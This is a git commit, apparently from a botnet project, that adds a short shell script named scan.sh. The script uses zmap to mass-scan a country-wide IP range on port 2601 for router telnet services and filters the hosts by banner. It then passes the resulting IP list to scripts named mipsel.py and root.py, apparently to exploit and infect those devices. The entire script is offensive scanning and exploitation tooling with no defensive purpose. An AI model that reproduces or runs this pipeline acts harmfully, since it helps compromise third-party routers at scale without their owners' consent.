d57d1f8765a5150c3ade1acd8ce2e40198772a79
ddos <109574396+SonuModder1@users.noreply.github.com>
2024-03-22 16:01:46 +0530

    Add files via upload

---
+++ scan.sh
@@ -0,0 +1,6 @@
+rm -rf live banners ips.txt
+zmap -p2601 -w cn.zone -o live
+cat live | ./z telnet -p2601 > banners
+cat banners | grep Suppress | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u > ips.txt
+python3 mipsel.py ips.txt
+python3 root.py ips.txt
